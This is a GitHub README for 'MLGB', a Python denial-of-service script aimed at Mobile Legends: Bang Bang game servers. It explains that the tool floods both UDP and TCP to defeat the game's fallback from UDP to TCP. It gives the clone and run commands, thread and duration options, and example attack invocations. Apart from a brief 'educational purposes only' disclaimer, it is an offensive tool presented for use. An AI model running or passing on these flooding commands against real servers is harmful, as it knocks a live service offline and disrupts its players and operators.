<p align="center"><img src="https://i.imgur.com/6WaJAdA.png" width="187px" height="125px"></p>
<h1 align="center">MLGB (Mobile Legends: Gang Bang)</h1>

<h5 align="center">DoS attack script for MLBB (Mobile Legends: Bang Bang) game servers.</h5>
<em><h6 align="center">This script is provided for educational purposes only. Unauthorized use against servers without explicit permission is illegal and unethical. The authors of this script are not responsible for any misuse.</h6></em>

<p align="center"><img src="https://i.imgur.com/anFgJFI.png"></p>

## Overview
**MLGB** is a Denial of Service (DoS) attack script specifically developed to disrupt the game servers of MLBB. It leverages both UDP and TCP flooding techniques to overwhelm the target server, potentially causing lag, disconnections, or even crashes.

## Why TCP?
While MLBB primarily uses UDP for communication, the game automatically switches to TCP if the UDP connection becomes unstable or fails. This script is designed to exploit that by attacking both protocols, ensuring the server remains overloaded even after protocol switching.

## Get Started
```shell script
git clone https://github.com/v9lu/mlgb.git
cd mlgb
python3 mlgb.py --target <ip:port>
```

## Options
```shell script
--help (-h) # Show help message
--target (-t) # IP:port of the target server
--udp_thread_count (-utc) # Number of UDP attack threads (default: 25)
--tcp_thread_count (-ttc) # Number of TCP attack threads (default: 25)
--udp_duration (-ud) # UDP attack duration in seconds (default: 300)
--tcp_duration (-td) # TCP attack duration in seconds (default: 300)
```

## Example Usage
1. **Basic Attack**: 25 threads for UDP and TCP attacks, 5 minutes duration on a server with IP `192.168.1.100` and port `5000`:
```shell script
python3 mlgb.py -t 192.168.1.100:5000
```
2. **Increased Threads**: 30 threads for UDP attack and 50 threads for TCP attack on the same server:
```shell script
python3 mlgb.py -t 192.168.1.100:5000 -utc 30 -ttc 50
```
3. **Short Attack**: 25 threads for UDP and TCP attacks, each lasting 1 minute:
```shell script
python3 mlgb.py -t 192.168.1.100:5000 -ud 60 -td 60
```
